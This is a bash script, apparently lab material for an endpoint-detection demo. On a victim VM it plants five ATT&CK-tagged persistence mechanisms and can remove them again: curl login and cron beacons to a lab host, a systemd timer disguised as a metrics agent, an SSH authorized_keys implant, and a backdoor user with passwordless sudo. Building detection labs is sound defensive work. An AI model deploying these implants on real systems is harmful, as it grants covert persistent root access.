#!/bin/bash
# =============================================================================
# Linux Persistence Simulator - DC862 Endpoint Detection Demo
# Runs ON the victim VM (10.0.2.30). Benign, lab-only, self-contained.
# Idempotent: safe to re-run. Use --cleanup to fully reverse every stage.
# Usage: sudo bash persistence.sh [--cleanup]
# =============================================================================
set -euo pipefail

if [ "${1:-}" == "--help" ] || [ "${1:-}" == "-h" ]; then
  cat <<'EOF'
Linux Persistence Simulator - DC862 Endpoint Detection Demo

Plants 5 benign, ATT&CK-tagged Linux persistence mechanisms on the victim VM
so the endpoint telemetry layer (Elastic Fleet + Elastic Defend + auditd) has
something to detect. Idempotent - safe to re-run.

Usage: sudo bash persistence.sh [--cleanup|--help]

Stages:
  1. ~/.bashrc / ~/.profile login beacon      (T1546.004)
  2. /etc/cron.d/ cron job                    (T1053.003)
  3. systemd service + timer                  (T1543.002)
  4. SSH authorized_keys implant               (T1098.004)
  5. new user + sudoers entry                  (T1136.001)

  --cleanup   Fully reverse all 5 stages (idempotent).
  --help      Show this message and exit.
EOF
  exit 0
fi

CLEANUP=0
if [ "${1:-}" == "--cleanup" ]; then
  CLEANUP=1
fi

if [ "$EUID" -ne 0 ]; then
  echo "Please run with sudo: sudo bash $0 ${1:-}"
  exit 1
fi

LAB_BEACON_HOST="10.0.1.10"
IMPLANT_USER="labsvc"
MARKER="# dc862-persistence-demo"

echo "═══════════════════════════════════════════════"
echo "  Linux Persistence Simulator"
echo "  Mode: $([ $CLEANUP -eq 1 ] && echo CLEANUP || echo DEPLOY)"
echo "  Time: $(date -u)"
echo "═══════════════════════════════════════════════"
echo ""

# ---------------------------------------------------------
# STAGE 1: ~/.bashrc / ~/.profile append - T1546.004
# ---------------------------------------------------------
echo "╔══════════════════════════════════════╗"
echo "║  Stage 1: Shell profile beacon       ║"
echo "╚══════════════════════════════════════╝"

TARGET_HOME="/root"
for f in "$TARGET_HOME/.bashrc" "$TARGET_HOME/.profile"; do
  if [ $CLEANUP -eq 1 ]; then
    if [ -f "$f" ]; then
      sed -i "/${MARKER//\//\\/}/,+1d" "$f"
      echo "[*] Removed beacon from $f"
    fi
  else
    if ! grep -qF "$MARKER" "$f" 2>/dev/null; then
      {
        echo "$MARKER"
        echo "(curl -s --max-time 2 http://${LAB_BEACON_HOST}/beacon?login=\$(whoami) >/dev/null 2>&1 &)"
      } >> "$f"
      echo "[*] Appended login beacon to $f"
    else
      echo "[*] $f already has beacon (idempotent skip)"
    fi
  fi
done

echo "[✓] Stage 1 complete"
echo ""

# ---------------------------------------------------------
# STAGE 2: cron job in /etc/cron.d/ - T1053.003
# ---------------------------------------------------------
echo "╔══════════════════════════════════════╗"
echo "║  Stage 2: Cron persistence           ║"
echo "╚══════════════════════════════════════╝"

CRON_FILE="/etc/cron.d/system-health-check"
if [ $CLEANUP -eq 1 ]; then
  rm -f "$CRON_FILE"
  echo "[*] Removed $CRON_FILE"
else
  cat > "$CRON_FILE" <<EOF
$MARKER
*/5 * * * * root curl -s --max-time 2 http://${LAB_BEACON_HOST}/beacon?cron=1 >/dev/null 2>&1
EOF
  chmod 644 "$CRON_FILE"
  echo "[*] Wrote $CRON_FILE"
fi

echo "[✓] Stage 2 complete"
echo ""

# ---------------------------------------------------------
# STAGE 3: systemd service + timer - T1543.002
# ---------------------------------------------------------
echo "╔══════════════════════════════════════╗"
echo "║  Stage 3: systemd service + timer    ║"
echo "╚══════════════════════════════════════╝"

SVC_NAME="system-metrics-agent"
SVC_FILE="/etc/systemd/system/${SVC_NAME}.service"
TIMER_FILE="/etc/systemd/system/${SVC_NAME}.timer"

if [ $CLEANUP -eq 1 ]; then
  systemctl stop "${SVC_NAME}.timer" 2>/dev/null || true
  systemctl disable "${SVC_NAME}.timer" 2>/dev/null || true
  rm -f "$SVC_FILE" "$TIMER_FILE"
  systemctl daemon-reload
  echo "[*] Removed ${SVC_NAME}.service / .timer"
else
  cat > "$SVC_FILE" <<EOF
[Unit]
Description=System metrics agent ${MARKER}

[Service]
Type=oneshot
ExecStart=/usr/bin/curl -s --max-time 2 http://${LAB_BEACON_HOST}/beacon?systemd=1
EOF

  cat > "$TIMER_FILE" <<EOF
[Unit]
Description=Run system metrics agent periodically ${MARKER}

[Timer]
OnBootSec=2min
OnUnitActiveSec=10min

[Install]
WantedBy=timers.target
EOF

  systemctl daemon-reload
  systemctl enable --now "${SVC_NAME}.timer"
  echo "[*] Installed and started ${SVC_NAME}.timer"
fi

echo "[✓] Stage 3 complete"
echo ""

# ---------------------------------------------------------
# STAGE 4: SSH authorized_keys implant - T1098.004
# ---------------------------------------------------------
echo "╔══════════════════════════════════════╗"
echo "║  Stage 4: SSH authorized_keys implant║"
echo "╚══════════════════════════════════════╝"

SSH_DIR="/root/.ssh"
AUTH_KEYS="$SSH_DIR/authorized_keys"
IMPLANT_KEY_PATH="/root/.dc862-implant-key"

if [ $CLEANUP -eq 1 ]; then
  if [ -f "$AUTH_KEYS" ]; then
    sed -i "/dc862-demo-implant/d" "$AUTH_KEYS"
    echo "[*] Removed implant key from $AUTH_KEYS"
  fi
  rm -f "$IMPLANT_KEY_PATH" "${IMPLANT_KEY_PATH}.pub"
  echo "[*] Removed generated implant keypair"
else
  mkdir -p "$SSH_DIR"
  chmod 700 "$SSH_DIR"
  touch "$AUTH_KEYS"
  if [ ! -f "${IMPLANT_KEY_PATH}.pub" ]; then
    ssh-keygen -t ed25519 -f "$IMPLANT_KEY_PATH" -N "" -C dc862-demo-implant -q
    echo "[*] Generated throwaway implant keypair at $IMPLANT_KEY_PATH"
  else
    echo "[*] Implant keypair already exists (idempotent skip)"
  fi
  if ! grep -qF "dc862-demo-implant" "$AUTH_KEYS"; then
    cat "${IMPLANT_KEY_PATH}.pub" >> "$AUTH_KEYS"
    echo "[*] Added implant public key to $AUTH_KEYS"
  else
    echo "[*] Implant key already present in $AUTH_KEYS (idempotent skip)"
  fi
  chmod 600 "$AUTH_KEYS"
fi

echo "[✓] Stage 4 complete"
echo ""

# ---------------------------------------------------------
# STAGE 5: new user + sudoers entry - T1136.001
# ---------------------------------------------------------
echo "╔══════════════════════════════════════╗"
echo "║  Stage 5: Backdoor user + sudoers    ║"
echo "╚══════════════════════════════════════╝"

SUDOERS_FILE="/etc/sudoers.d/90-${IMPLANT_USER}"

if [ $CLEANUP -eq 1 ]; then
  rm -f "$SUDOERS_FILE"
  if id "$IMPLANT_USER" &>/dev/null; then
    userdel -r "$IMPLANT_USER" 2>/dev/null || userdel "$IMPLANT_USER" 2>/dev/null || true
    echo "[*] Removed user $IMPLANT_USER"
  fi
  echo "[*] Removed $SUDOERS_FILE"
else
  if ! id "$IMPLANT_USER" &>/dev/null; then
    useradd -m -s /bin/bash -c "dc862-persistence-demo" "$IMPLANT_USER"
    echo "[*] Created user $IMPLANT_USER"
  else
    echo "[*] User $IMPLANT_USER already exists (idempotent skip)"
  fi
  echo "$MARKER" > "$SUDOERS_FILE"
  echo "${IMPLANT_USER} ALL=(ALL) NOPASSWD:ALL" >> "$SUDOERS_FILE"
  chmod 440 "$SUDOERS_FILE"
  visudo -cf "$SUDOERS_FILE" || { echo "[!] sudoers syntax check failed, removing"; rm -f "$SUDOERS_FILE"; exit 1; }
  echo "[*] Wrote $SUDOERS_FILE"
fi

echo "[✓] Stage 5 complete"
echo ""

# ---------------------------------------------------------
# Done
# ---------------------------------------------------------
echo "═══════════════════════════════════════════════"
if [ $CLEANUP -eq 1 ]; then
  echo "  Cleanup complete - all 5 stages reversed"
else
  echo "  Persistence Deployment Complete"
  echo ""
  echo "  Stages planted:"
  echo "   1. ~/.bashrc /.profile login beacon (T1546.004)"
  echo "   2. /etc/cron.d/system-health-check (T1053.003)"
  echo "   3. systemd ${SVC_NAME}.service/.timer (T1543.002)"
  echo "   4. SSH authorized_keys implant (T1098.004)"
  echo "   5. user ${IMPLANT_USER} + sudoers (T1136.001)"
  echo ""
  echo "  Query endpoint telemetry via SOC console or MCP server."
  echo "  Reverse everything with: sudo bash $0 --cleanup"
fi
echo "  Time: $(date -u)"
echo "═══════════════════════════════════════════════"